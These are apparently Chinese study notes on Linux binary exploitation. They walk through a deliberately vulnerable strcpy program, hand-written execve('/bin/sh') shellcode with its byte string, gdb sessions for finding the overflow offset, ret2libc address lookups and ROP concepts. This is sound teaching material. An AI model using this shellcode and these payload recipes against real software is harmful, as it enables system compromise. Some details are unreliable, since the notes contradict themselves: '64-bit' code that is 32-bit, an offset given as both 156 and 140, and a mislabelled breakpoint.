# 长亭PWN笔记01

## PWN工具集合

- zio - 框架
  - 接口简单易用
  - https://github.com/zTrix/zio
- Pwntools
  - Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等
  - http://pwntools.com/
  - https://github.com/gallopsled/pwntools
- peda/pwndbg - gdb调试插件
- libheap 

## 利用栈溢出

### Example BOE program：

```c
#include<stdio.h>
#include<string.h>
int main(int argc,char **argv){
    char buf[128];
    if (argc<2) return 1;
    strcpy(buf,argv[1]);
    printf("argv[1]:%s\n",buf);
    return 0;
}
```

> 1. 作为第一个漏洞利用的案例，我们不开启栈不可执行和栈canary的保护选项
>
> 2. argc即命令行参数个数
>
> 3. argv[0]即程序名字符串本身，argv[1]是第一个参数，以此类推

编译命令如下：

```shell
gcc -z execstack -fno-stack-protector bof.c -o bof -m32
```

### 分析：

程序接收命令行输入第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf

| 高地址 |  char **argv   |
| :----: | :------------: |
|        |    int argc    |
|        | return address |
|        |   saved %ebp   |
| 低地址 | char buf[128]  |

- 栈在内存中是从高地址到低地址增长
- 局部变量char是从低地址到高地址增长

当字符串参数过长就会出现：

| 高地址 | char **argv  |
| :----: | :----------: |
|        |   int argc   |
|        | buf[132~135] |
|        | buf[128~131] |
| 低地址 |  buf[0~127]  |

可以把Shellcode放在返回地址之后，然后通过覆盖返回地址跳转至Shellcode

| 高地址 |   Shellcode    |
| :----: | :------------: |
|        |   Shellcode    |
|        | Shellcode addr |
|        |  buf[128~131]  |
| 低地址 |   buf[0~127]   |

```
payload : padding1 + address of shellcode + shellcode
```

有一种手法可以把return address覆盖为`jmp esp`的地址，这样就不用管具体Shellcode addr的具体地址了，只要shellcode跟在`jmp esp`指令后面即可

| 高地址 |   Shellcode    |         |
| :----: | :------------: | :-----: |
|        |   Shellcode    |         |
|        | Shellcode addr | jmp esp |
|        |  buf[128~131]  |         |
| 低地址 |   buf[0~127]   |         |

```
payload : padding1 + address of jmp esp + shellcode
```

## shellcode

### 手写

首先查看一下execve函数的原型：

```c
int execve(const char *filename,char *const argv[],cahr *const envp[])
```

手写64位下的shellcode代码

```assembly
xor %eax,%eax
pushl %eax
push $0x68732f2f
push $0x6e69622f
movl %esp,%ebx
pushl %eax
pushl %ebx
movl %esp,%ecx
cltd
movb $0xb,%al
int $0x80
```

> 此处eax为0，因此cltd相当于将edx也设为0

以上代码实现的效果就是

```c
execve("/bin/sh",null,null)
```

Syscall 调用约定

- syscall number: %eax=0xb
- 第一个参数：%ebx=filename
- 第二个参数：%ecx=argv
- 第三个参数：%edx=envp=0
- 第四个参数：%esi
- 第五个参数：%edi
- 第六个参数：%ebp

### 测试

用内联（inline）汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码

```c
void shellcode()
{
    _asm_(
    "xor %eax,%eax\n\t"
    "pushl %eax\n\t"
    "push $0x68732f2f\n\t"
    "push $0x6e69622f\n\t"
    "movl %esp,%ebx\n\t"
    "pushl %eax\n\t"
    "pushl %ebx\n\t"
    "movl %esp,%ecx\n\t"  
    "cltd\n\t"
    "movb $0xb,%al\n\t"
    "int $0x80\n\t"      
    )
}
int main(int argc,char **argv)
{
    shellcode();
    return 0;
}
```

### 提取

提取测试代码反汇编出来的机器码

```shell
objdump -d shellcode
```

提取得到shellcode的指令的机器码

```
SHELLCODE = "
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80
"
```

所以上述代码还可以改写为：

```c
char shellcode[]=
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80";
int main(int argc,char **argv)
{
    void(*f)()=(void(*)())shellcode;
    f();
    return 0;
}
```

段代码中，shellcode存储在全局字符数组中，属于.data section,编译器默认其不可执行，必须加上选项-z execstack,即开启栈/堆/数据段可执行

## 栈溢出漏洞利用步骤

1. 找到能够刚好覆盖返回地址的缓冲区长度
2. 填充Shellcode并找到Shellcode所在地址
3. 将返回地址覆盖为Shellcode地址

## 寻找填充长度

### 手动寻找

为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时esp指向的即是返回地址所在位置。

现在依然以上文的示例程序为例：

```shell
syc@ubuntu:~/Desktop/test$ gdb -q --args bof AAAA
pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from bof...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/syc/Desktop/test/bof AAAA
argv[1]:AAAA
[Inferior 1 (process 3282) exited normally]
pwndbg> disassemble main
Dump of assembler code for function main:
   0x5655554d <+0>:	lea    ecx,[esp+0x4]
   0x56555551 <+4>:	and    esp,0xfffffff0
   0x56555554 <+7>:	push   DWORD PTR [ecx-0x4]
   0x56555557 <+10>:	push   ebp
   0x56555558 <+11>:	mov    ebp,esp
   0x5655555a <+13>:	push   ebx
   0x5655555b <+14>:	push   ecx
   0x5655555c <+15>:	add    esp,0xffffff80
   0x5655555f <+18>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555564 <+23>:	add    ebx,0x1a70
   0x5655556a <+29>:	mov    eax,ecx
   0x5655556c <+31>:	cmp    DWORD PTR [eax],0x1
   0x5655556f <+34>:	jg     0x56555578 <main+43>
   0x56555571 <+36>:	mov    eax,0x1
   0x56555576 <+41>:	jmp    0x565555b1 <main+100>
   0x56555578 <+43>:	mov    eax,DWORD PTR [eax+0x4]
   0x5655557b <+46>:	add    eax,0x4
   0x5655557e <+49>:	mov    eax,DWORD PTR [eax]
   0x56555580 <+51>:	sub    esp,0x8
   0x56555583 <+54>:	push   eax
   0x56555584 <+55>:	lea    eax,[ebp-0x88]
   0x5655558a <+61>:	push   eax
   0x5655558b <+62>:	call   0x565553e0 <strcpy@plt>
   0x56555590 <+67>:	add    esp,0x10
   0x56555593 <+70>:	sub    esp,0x8
   0x56555596 <+73>:	lea    eax,[ebp-0x88]
   0x5655559c <+79>:	push   eax
   0x5655559d <+80>:	lea    eax,[ebx-0x1994]
   0x565555a3 <+86>:	push   eax
   0x565555a4 <+87>:	call   0x565553d0 <printf@plt>
   0x565555a9 <+92>:	add    esp,0x10
   0x565555ac <+95>:	mov    eax,0x0
   0x565555b1 <+100>:	lea    esp,[ebp-0x8]
   0x565555b4 <+103>:	pop    ecx
   0x565555b5 <+104>:	pop    ebx
   0x565555b6 <+105>:	pop    ebp
   0x565555b7 <+106>:	lea    esp,[ecx-0x4]
   0x565555ba <+109>:	ret    
End of assembler dump.
```

在调用`strcpy`和`ret`指令处下断点

```shell
pwndbg> b *0x5655558b
Breakpoint 1 at 0x5655558b
pwndbg> b *0x565555ba
Breakpoint 2 at 0x565555ba
```

开始调试

```shell
pwndbg> r AAAA
Starting program: /home/syc/Desktop/test/bof AAAA

Breakpoint 1, 0x5655558b in main ()
 ► 0x5655558b <main+62>     call   strcpy@plt <0x565553e0>
        dest: 0xffffced0 ◂— 0x0
        src: 0xffffd1fd ◂— 'AAAA'

pwndbg> x/wx $esp
0xffffcec0:	0xffffced0	0xffffd1fd 
//分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffced0
pwndbg> c
Continuing.
argv[1]:AAAA

Breakpoint 2, 0x565555ba in main ()
pwndbg> x/wx $esp
0xffffcf6c:	0xf7df4e81
pwndbg> p/d 0xffffcf6c - 0xffffced0
$1 = 156
```

- 在第一个断点处，找到缓冲区起始地址为0xffffced0
- 2在第二个断点处，找到缓冲区起始地址为0xffffcf6c
- 二者相减可以知道溢出超过140字节时会覆盖返回地址

### pwntools之cyclic

Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置

在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。
用法：

```
cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串
cyclic_find(0x61616161) # 找到该数据在pattern中的位置
cyclic_find('aaaa') # 查找位置也可以使用字符串去定位
```

比如，我们在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算

## Return to Libc

发生栈溢出时，不跳转到shellcode，而实跳转到libc中的函数

### 简单的一个函数

以调用system函数为例的栈布局

|             |     0     |
| :---------: | :-------: |
|             | "/bin/sh" |
|             |   exit    |
| return addr |  system   |
|             |  padding  |

system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)，所以相当于执行了：

```c
system("/bin/sh")
exit(0)
```

简单来说就是：

- 获得system()和exit()的函数地址
- 获得"/bin/sh"字符串地址
- 构造溢出载荷
  - system + exit + "bin/sh" + 0
- 实验在关闭ASLR情况下进行，libc函数地址固定不变

#### 获得system()和exit()的函数地址

- 可以在GDB中直接使用print命令查看

```shell
pwndbg> print system
$1 = {int (const char *)} 0xf7e19200 <__libc_system>
pwndbg> p exit
$2 = {void (int)} 0xf7e0c3d0 <__GI_exit>
```

#### 获得"/bin/sh"字符串地址

glibc中必定有字符串”/bin/sh"，可以使用GDB中的find命令，在libc的内存范围内搜索

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x56555000 0x56556000 r-xp     1000 0      /home/syc/Desktop/test/bof
0x56556000 0x56557000 r-xp     1000 0      /home/syc/Desktop/test/bof
0x56557000 0x56558000 rwxp     1000 1000   /home/syc/Desktop/test/bof
0xf7ddc000 0xf7fb1000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7fb1000 0xf7fb2000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb2000 0xf7fb4000 r-xp     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb4000 0xf7fb5000 rwxp     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb5000 0xf7fb8000 rwxp     3000 0      
0xf7fd0000 0xf7fd2000 rwxp     2000 0      
0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]
0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]
0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r-xp     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rwxp     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
pwndbg> find /b 0xf7ddc000, 0xf7fb5000,'/','b','i','n','/','s','h',0
0xf7f5a0cf
1 pattern found.
pwndbg> x/s 0xf7f5a0cf
0xf7f5a0cf:	"/bin/sh"
```

0xf7ddc000是libc起始地址，0xf7fb5000是结尾地址

#### 获取地址的另一种方法

```shell
syc@ubuntu:~/Desktop/test$ ldd bof
	linux-gate.so.1 (0xf7eff000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d03000)
	/lib/ld-linux.so.2 (0xf7f00000)
syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   ...
  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   ...
   147: 000303d0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   ...
syc@ubuntu:~/Desktop/test$ strings -tx  /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 17e0cf /bin/sh
 syc@ubuntu:~/Desktop/test$ gdb -q
pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> p/x 0xf7d03000 + 0x0003d200
$1 = 0xf7d40200
pwndbg> p/x 0xf7d03000 + 0x000303d0
$2 = 0xf7d333d0
pwndbg> p/x 0xf7d03000 + 0x017e0cf
$3 = 0xf7e810cf
```

- 首先用ldd命令获取libc基址
- 然后用readelf命令找到system和exit函数在libc中的偏移
- 用strings命令找到字符串/bin/sh在libc中的偏移
- 最后通过与libc基址相加来获得最终地址

有时候我们会发现"/bin/sh"的地址中包含换行符0a，argv[1]会被换行符截断，解决方案：使用"sh\0"

可以更换一个命令字符串，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个"sh"字符串，将其地址作为system()函数的参数即可。

我们在程序自身空间内就可以找到"sh"这个字符串，同样使用find命令。

```shell
pwndbg> find /b 0xf7ddc000, 0xf7fb5000, 's','h',0
0xf7deacd3
0xf7dead32
0xf7debe59
0xf7dec4ac
0xf7dee4f6
0xf7dee5d3
0xf7deee85
0xf7def172
0xf7f573b5 <__re_error_msgid+117>
0xf7f57dc1 <afs.8574+193>
0xf7f5a0d4
0xf7f5bacd
12 patterns found.
pwndbg> x/s 0xf7deacd3
0xf7deacd3:	"sh"
```

## Return to PLT

- 如果动态共享库的地址随机化保护开启，则无法知道libc地址
- 而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址

## 重新思考Return to Libc

- 利用Return to Libc，我们调用了system("/bin/sh")和exit(0)
- system()和exit()函数本质上都是以ret指令结尾的代码片段
- 那如果其他ret结尾的代码片段呢？例如几条指令组成的小代码片段。同样可行！

## ROP（Return Oriented Programming）

- 通过拼接以ret指令结尾的代码片段来实现某些功能的技术，称为ROP
- 以ret指令结尾的小段代码片段我们称为ROP gadget：例如：pop edx;ret
- 为实现某-功能拼接而成的多个ROP gadget,我们称为ROP链(ROP Chain）
- 在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们称为ROP载荷(ROP Payload)
- ROP技术是Return to libc的扩 展，Return to libc是ROP的一 种特殊情况，即ROP gadget恰好是libc函数的情形

## ROP的扩展-JOP、COP

- 换汤不换药，把使用的的代码片段从ret结尾拓展到jmp/call结尾
- JOP（Jump Oriented Programming）
  - pop esi ; jmp dword [esi-0x70]
- COP（Call Oriented Programming）
  - mov edx,dowrd [esp+0x48] ; call doword [eax+0x10]

## ROP Gadget 搜索工具

- ROPGadget
  - https://github.com/JonathanSalwan/ROPgadget
- rp
  - https://github.com/0vercl0k/rp
- ropper
  - https://github.com/sashs/Ropper
- xrop
  - https://github.com/acama/xrop